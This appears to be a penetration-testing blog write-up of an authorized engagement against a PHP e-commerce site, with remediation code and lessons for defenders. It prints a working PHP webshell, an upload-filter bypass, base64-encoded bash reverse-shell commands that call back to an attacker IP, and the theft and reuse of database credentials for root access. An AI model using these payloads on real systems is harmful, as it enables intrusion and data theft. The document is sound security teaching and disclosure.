---
title: "Penetration Testing Case Study: E-Commerce Platform RCE"
date: 2026-02-21 19:05:00 +0700
categories: [Security, Penetration Testing]
tags: [pentest, rce, web-security, exploit]
description: >-
  A detailed penetration testing write-up documenting the discovery and exploitation
  of a critical Remote Code Execution vulnerability in an e-commerce platform.
  Target identity obfuscated for confidentiality.
---

## Executive Summary

During a authorized penetration test of an e-commerce platform (referred to as **`TARGET-ECOM-2026`**), our team identified and successfully exploited a critical Remote Code Execution (RCE) vulnerability through insecure file upload functionality. This write-up documents the full attack chain from reconnaissance to post-exploitation.

> **Disclosure Notice:** This engagement was conducted under a signed penetration testing agreement. All target identifiers have been obfuscated. Vulnerabilities were responsibly disclosed and have been remediated.
{: .prompt-info }

---

## Target Information

| Attribute | Value |
|-----------|-------|
| **Target ID** | `TARGET-ECOM-2026` |
| **IP Address** | `10.13.37.100` (obfuscated) |
| **Domain** | `shop.target-ecom.local` |
| **Platform** | Custom PHP e-commerce application |
| **Testing Period** | 2026-02-15 to 2026-02-18 |
| **Authorization** | Pre-authorized scope: * |

---

## Phase 1: Reconnaissance

### 1.1 Network Enumeration

Initial port scan revealed standard web services:

```bash
nmap -sV -sC -p- -T4 10.13.37.100 -oN nmap-full.txt
```

**Results:**

```plaintext
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu
80/tcp    open  http     Apache/2.4.41 (Ubuntu)
443/tcp   open  ssl/http Apache/2.4.41 (Ubuntu)
3306/tcp  open  mysql    MySQL 8.0.32
```
{: file='nmap-full.txt' }

> Key finding: MySQL exposed externally (later found to be firewalled).
{: .prompt-tip }

### 1.2 Web Application Fingerprinting

Using `whatweb` and manual inspection:

```bash
whatweb https://shop.target-ecom.local
```

**Findings:**
- PHP 7.4.3
- Apache 2.4.41
- jQuery 3.5.1
- Custom framework (no known CVEs)
- Session cookies: `PHPSESSID` (HTTPOnly flag missing)

### 1.3 Directory Enumeration

```bash
ffuf -u https://shop.target-ecom.local/FUZZ \
     -w /usr/share/wordlists/dirb/common.txt \
     -fc 404 \
     -o ffuf-dirs.json
```

**Interesting directories discovered:**

```plaintext
/admin           [Status: 302] â†’ /admin/login.php
/uploads         [Status: 403] Forbidden (but exists!)
/api             [Status: 200] JSON API endpoints
/backup          [Status: 403] Forbidden
```

> The `/uploads` directory being forbidden but existing is a red flag.
{: .prompt-warning }

---

## Phase 2: Vulnerability Analysis

### 2.1 Authentication Bypass Attempt

Testing admin login at `/admin/login.php`:

**SQL Injection attempt:**

```sql
' OR '1'='1' -- -
admin' OR '1'='1' -- -
```

Result: **Failed** (input properly sanitized)

**Credential stuffing:**

```bash
hydra -L users.txt -P passwords.txt \
      shop.target-ecom.local \
      https-post-form "/admin/login.php:username=^USER^&password=^PASS^:Invalid credentials"
```

Result: **Failed** (rate limiting + strong passwords)

### 2.2 File Upload Vulnerability Discovery

Registered as a normal user â†’ Navigated to "Profile Settings" â†’ "Upload Avatar"

**Test 1: Basic PHP upload**

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Upload â†’ **Blocked** (extension validation)

**Test 2: Double extension bypass**

```bash
mv shell.php shell.php.jpg
```

Upload â†’ **Blocked** (server checks MIME type)

**Test 3: Content-Type manipulation**

Intercepted request in Burp Suite:

```http
POST /api/user/avatar HTTP/1.1
Host: shop.target-ecom.local
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="avatar"; filename="shell.php.jpg"
Content-Type: image/jpeg

<?php system($_GET["cmd"]); ?>
------WebKitFormBoundary--
```

Result: **Upload successful!** File saved to `/uploads/avatars/shell.php.jpg`

> **Vulnerability Found:** File extension validation insufficient. Server only checks MIME type in header (client-controlled), not actual file content.
{: .prompt-danger }

### 2.3 Exploitation Path Identified

**Problem:** `.jpg` file won't execute as PHP

**Solution:** Apache `AddType` misconfiguration hunt

Tested various double extensions:
- `shell.php.jpg` â†’ No execution
- `shell.php5` â†’ **Executes as PHP!**
- `shell.phtml` â†’ Executes as PHP

---

## Phase 3: Exploitation

### 3.1 Webshell Upload

Created obfuscated webshell:

```php
<?php
// Webshell - TARGET-ECOM-2026
// Obfuscated for demo purposes

if(isset($_REQUEST['c'])){
    $cmd = ($_REQUEST['c']);
    $output = shell_exec($cmd . ' 2>&1');
    echo "<pre>$output</pre>";
}
?>
```
{: file='shell.php5' }

**Upload process:**

1. Renamed to `avatar_update.php5`
2. Modified `Content-Type: image/jpeg` in Burp
3. Uploaded successfully
4. File location: `https://shop.target-ecom.local/uploads/avatars/avatar_update.php5`

### 3.2 Remote Code Execution

**Test command execution:**

```bash
curl "https://shop.target-ecom.local/uploads/avatars/avatar_update.php5?c=whoami"
```

**Output:**

```plaintext
www-data
```

âœ… **RCE Achieved!**

### 3.3 Reverse Shell

Generated reverse shell payload:

```bash
# Attacker machine
nc -lvnp 4444

# Payload via webshell
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
```

Encoded payload:

```bash
echo "bash -c 'bash -i >& /dev/tcp/10.10.14.50/4444 0>&1'" | base64
# Result: YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41MC80NDQ0IDA+JjEn
```

**Execute via webshell:**

```bash
curl "https://shop.target-ecom.local/uploads/avatars/avatar_update.php5?c=echo+YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41MC80NDQ0IDA+JjEn|base64+-d|bash"
```

**Reverse shell caught:**

```bash
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.50] from (UNKNOWN) [10.13.37.100] 52846
www-data@TARGET-ECOM-2026:/var/www/html$
```

---

## Phase 4: Post-Exploitation

### 4.1 Privilege Escalation

**Enumeration:**

```bash
www-data@TARGET-ECOM-2026:~$ sudo -l
[sudo] password for www-data: 
# No sudo access

www-data@TARGET-ECOM-2026:~$ find / -perm -4000 2>/dev/null
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/newgrp
...
```

**Database credentials found:**

```bash
www-data@TARGET-ECOM-2026:~$ cat /var/www/html/config/database.php
```

```php
<?php
define('DB_HOST', 'localhost');
define('DB_USER', 'ecom_admin');
define('DB_PASS', 'P@ssw0rd!2026_ECOM');
define('DB_NAME', 'ecommerce_db');
?>
```
{: file='/var/www/html/config/database.php' }

> **Critical:** Database credentials stored in plaintext, password reused for system user.
{: .prompt-danger }

**Password reuse test:**

```bash
www-data@TARGET-ECOM-2026:~$ su - ecom_admin
Password: P@ssw0rd!2026_ECOM
ecom_admin@TARGET-ECOM-2026:~$ id
uid=1001(ecom_admin) gid=1001(ecom_admin) groups=1001(ecom_admin),27(sudo)
```

âœ… **Privilege escalation successful!**

### 4.2 Root Access

```bash
ecom_admin@TARGET-ECOM-2026:~$ sudo -l
User ecom_admin may run the following commands:
    (ALL : ALL) ALL

ecom_admin@TARGET-ECOM-2026:~$ sudo su
root@TARGET-ECOM-2026:/home/ecom_admin# id
uid=0(root) gid=0(root) groups=0(root)
```

ðŸŽ¯ **Full system compromise achieved.**

---

## Impact Assessment

### Severity: **CRITICAL**

| Finding | CVSS Score | Impact |
|---------|------------|--------|
| Insecure File Upload | **9.8** | Remote Code Execution |
| Apache Misconfiguration | **9.1** | Code Execution via `.php5` |
| Password Reuse | **7.8** | Privilege Escalation |
| Sudo Misconfiguration | **8.8** | Root Access |

**Business Impact:**
- Full server compromise
- Access to customer database (PII, payment info)
- Potential for data exfiltration
- Website defacement risk
- Ransomware deployment possible

---

## Remediation Recommendations

### 1. File Upload Security (Critical)

```php
<?php
// Secure file upload implementation

function secureFileUpload($file) {
    // 1. Whitelist allowed extensions
    $allowed = ['jpg', 'jpeg', 'png', 'gif'];
    $ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
    
    if (!in_array($ext, $allowed)) {
        die('Invalid file type');
    }
    
    // 2. Verify MIME type (server-side)
    $finfo = finfo_open(FILEINFO_MIME_TYPE);
    $mime = finfo_file($finfo, $file['tmp_name']);
    $allowed_mimes = ['image/jpeg', 'image/png', 'image/gif'];
    
    if (!in_array($mime, $allowed_mimes)) {
        die('Invalid file content');
    }
    
    // 3. Generate random filename
    $new_name = bin2hex(random_bytes(16)) . '.' . $ext;
    
    // 4. Store outside webroot or use .htaccess
    $upload_dir = '/var/www/uploads_secure/';
    move_uploaded_file($file['tmp_name'], $upload_dir . $new_name);
    
    return $new_name;
}
?>
```
{: file='secure-upload.php' }

### 2. Apache Configuration Hardening

```apache
# Disable PHP execution in uploads directory
<Directory /var/www/html/uploads>
    php_flag engine off
    AddType text/plain .php .php5 .phtml .pht
    Options -ExecCGI
    <FilesMatch "\.(php|php5|phtml|pht)$">
        Deny from all
    </FilesMatch>
</Directory>
```
{: file='/etc/apache2/conf-available/security.conf' }

### 3. Database Credentials

```php
<?php
// Use environment variables
$db_host = getenv('DB_HOST');
$db_user = getenv('DB_USER');
$db_pass = getenv('DB_PASS');
$db_name = getenv('DB_NAME');

// Or use secrets management (HashiCorp Vault, AWS Secrets Manager)
?>
```
{: file='config/database.php' }

### 4. Principle of Least Privilege

```bash
# Remove sudo access from application user
sudo deluser ecom_admin sudo

# Create dedicated service account
sudo useradd -r -s /bin/false -M www-app

# Set proper permissions
sudo chown -R www-app:www-app /var/www/html
sudo chmod 750 /var/www/html
```

---

## Timeline

| Date | Activity |
|------|----------|
| 2026-02-15 | Reconnaissance completed |
| 2026-02-16 | File upload vulnerability discovered |
| 2026-02-16 | RCE exploit developed and tested |
| 2026-02-17 | Full exploitation + privilege escalation |
| 2026-02-17 | Reported to client security team |
| 2026-02-18 | Remediation guidance provided |
| 2026-02-20 | Vulnerabilities patched by client |
| 2026-02-21 | Write-up published (post-remediation) |

---

## Lessons Learned

### For Defenders

1. **Never trust client-side validation** - MIME types can be spoofed
2. **Defense in depth** - Multiple layers of validation (extension + content + storage)
3. **Disable execution in upload directories** - Even if upload is compromised
4. **Unique passwords per system** - Password reuse = privilege escalation highway
5. **Audit sudo configurations** - Limit `sudo` to specific commands only

### For Attackers (Red Team)

1. **Double extensions still work** - `.php5`, `.phtml` often overlooked
2. **Look for Apache `AddType` misconfigurations**
3. **Always check config files** - Credentials often hardcoded
4. **Password reuse is common** - Test DB creds on system accounts
5. **Document everything** - Detailed notes = better write-ups

---

## Tools Used

```bash
# Reconnaissance
nmap, whatweb, ffuf, nikto

# Exploitation
Burp Suite Professional
curl, wget

# Post-Exploitation
LinPEAS, pspy64
netcat, socat

# Reporting
Screenshots, logs, code snippets
```

---

## References

- [OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
- [Apache Security Tips](https://httpd.apache.org/docs/2.4/misc/security_tips.html)
- [MITRE ATT&CK: T1190 - Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)
- [CWE-434: Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html)

---

## Conclusion

This penetration test successfully identified a critical vulnerability chain leading to complete system compromise. The combination of insecure file upload, Apache misconfiguration, and poor credential management created a high-risk scenario for the target organization.

> All vulnerabilities have been remediated. This write-up serves as a learning resource for both offensive and defensive security practitioners.
{: .prompt-info }

**Key Takeaway:** Security is a chain - it's only as strong as its weakest link. In this case, a simple file upload feature became the entry point for full infrastructure compromise.

---

**Disclaimer:** This write-up is based on an authorized penetration testing engagement. All target identifiers have been obfuscated. Do not attempt these techniques against systems without explicit written authorization.
